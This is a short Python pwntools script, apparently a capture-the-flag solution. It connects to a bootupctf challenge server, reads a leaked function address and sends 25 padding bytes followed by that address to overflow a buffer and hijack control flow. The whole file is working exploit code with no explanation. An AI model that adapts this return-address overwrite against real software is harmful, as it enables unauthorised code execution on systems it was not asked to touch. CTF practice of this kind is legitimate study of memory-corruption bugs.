from pwn import *

conn = remote('1-bm01.bootupctf.net',7902,level='error')
conn.recvuntil(b"Function: ")
target = conn.recvuntil(b"\n")
target = target.strip()
target = (p32(int(target,16)))
sleep(0.1)


conn.sendline(b'a'*25 + target)
conn.recvline()
print(conn.recvline())
